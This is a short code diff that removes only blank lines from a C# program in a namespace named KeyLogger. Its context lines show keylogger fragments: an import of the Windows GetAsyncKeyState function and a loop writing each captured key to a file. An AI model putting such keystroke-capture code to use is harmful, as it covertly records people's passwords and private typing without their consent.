@@ -9,8 +9,6 @@ namespace KeyLogger
 {
     static class Program
     {
-
-
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         public static void LogKeyStrokes()
@@ -42,7 +40,6 @@ namespace KeyLogger
                         {
                             sw.WriteLine((Keys)i);
                         }
-
                     }
                 }
             }
